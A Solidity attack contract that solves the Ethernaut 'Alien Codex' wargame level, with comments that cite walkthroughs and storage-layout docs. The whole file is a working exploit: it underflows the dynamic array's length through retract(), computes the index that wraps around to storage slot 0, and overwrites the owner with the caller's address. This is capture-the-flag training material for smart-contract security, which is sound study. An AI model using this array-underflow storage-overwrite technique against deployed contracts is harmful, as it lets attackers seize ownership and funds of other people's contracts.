// Main resource used to figure out the solution of this level: 
    // https://github.com/CeTesDev/EthernautLevels/tree/main/alien-codex
    // https://blog.dixitaditya.com/ethernaut-level-19-alien-codex
    // https://docs.soliditylang.org/en/v0.8.6/internals/layout_in_storage.html#mappings-and-dynamic-arrays

// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

interface IAlienCodex {
  function make_contact() external;

  function record(bytes32 _content) external;

  function retract() external;

  function revise(uint i, bytes32 _content) external;
}

contract AttackAlienCodex {
  IAlienCodex alienCodexContract;

  constructor(address _alienCodexContract) public {
    alienCodexContract = IAlienCodex(_alienCodexContract);
  }

  function attackContract(uint _arrayLengthStoredAtSlotNumber) public {
    // Set to true the contact variable
    alienCodexContract.make_contact();

    // Set the array's length to the MAX # of storage slots - For this to work the array's length must be set to 0
    alienCodexContract.retract();

    // At this point, the codex[] array's length is set to the MAX slot# (All 1s)
    // This means that the array can write to any slot in the storage

    // Calculate the array's index that will point to slot# 0
    // The slot# where the array length is stored will be received as a parameter!
    uint256 index = 2 ** 256 - 1 - uint(keccak256(abi.encode(_arrayLengthStoredAtSlotNumber))) + 1;

    // Conver the player's address to bytes32
    bytes32 playerAddress = bytes32(uint256(uint160(msg.sender)));
    
    // Take ownership of the AlienCodex contract
    alienCodexContract.revise(index, playerAddress);

  }


}